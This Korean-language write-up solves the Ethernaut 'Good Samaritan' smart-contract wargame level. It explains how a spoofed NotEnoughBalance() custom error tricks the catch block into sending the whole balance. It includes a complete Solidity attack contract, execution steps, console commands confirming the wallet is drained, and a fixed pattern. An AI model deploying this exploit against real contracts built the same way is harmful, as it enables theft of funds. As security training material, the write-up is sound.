# Ethernaut Level 27 - Good Samaritan

## 문제 설명

커스텀 에러(Custom Error)를 위조해 `GoodSamaritan`의 모든 코인을 탈취하는 것이 목표이다.

---

## 컨트랙트 분석

```solidity
contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    function requestDonation() external returns(bool enoughBalance) {
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // NotEnoughBalance 에러 발생 시 전액 전송
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Wallet {
    function donate10(address dest_) external onlyOwner {
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        }
        coin.transfer(dest_, 10);
    }

    function transferRemainder(address dest_) external onlyOwner {
        coin.transfer(dest_, coin.balances(address(this)));
    }
}
```

---

## 취약점 분석

### 커스텀 에러 발생 위치 미검증

`catch` 블록은 에러가 **어디서** 발생했는지 확인하지 않는다.

`donate10` → `coin.transfer` → **공격 컨트랙트의 `notify()`** 에서
`NotEnoughBalance()` 에러를 발생시키면:

```
GoodSamaritan.requestDonation()
→ wallet.donate10(attacker)
→ coin.transfer(attacker, 10)
→ attacker.notify(10) 호출
→ NotEnoughBalance() revert  ← 여기서 발생!
→ catch 블록 감지
→ wallet.transferRemainder(attacker)  ← 전액 전송!
```

---

## 공격 컨트랙트

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
}

contract GoodSamaritanAttack {
    // GoodSamaritan의 NotEnoughBalance와 동일한 시그니처
    error NotEnoughBalance();

    IGoodSamaritan public target;

    constructor(address _target) {
        target = IGoodSamaritan(_target);
    }

    function attack() public {
        target.requestDonation();
    }

    // Coin.transfer 시 호출되는 notify 함수
    function notify(uint256 amount) external pure {
        // 10개 받을 때는 에러 발생 → 전액 전송 트리거
        // 전액 전송 시에는 에러 없음 (무한루프 방지)
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
```

---

## 공격 단계

### Step 1 — 공격 컨트랙트 배포

```
_target : GoodSamaritan 인스턴스 주소
```

### Step 2 — attack 실행

transact 클릭 후 MetaMask 승인

### Step 3 — 확인

```js
let coinAddress = await contract.coin()
const coinABI = [{"name":"balances","type":"function",
    "inputs":[{"type":"address"}],"outputs":[{"type":"uint256"}]}]
const coin = new web3.eth.Contract(coinABI, coinAddress)

await coin.methods.balances(await contract.wallet()).call()
// → "0"

await coin.methods.balances(player).call()
// → 전체 잔액
```

---

## 핵심 교훈

- `catch` 블록에서 에러 발생 위치를 검증하지 않으면 위조 가능
- 커스텀 에러 시그니처는 4바이트로 누구나 동일하게 만들 수 있음
- 호출 체인의 어느 컨트랙트에서도 동일한 에러를 발생시킬 수 있음

```solidity
// ✅ 안전한 구현 예시
// 에러 발생 시 잔액을 직접 확인 후 판단
catch (bytes memory err) {
    if (...) {
        require(coin.balances(address(wallet)) == 0, "Not actually empty");
        wallet.transferRemainder(msg.sender);
    }
}
```
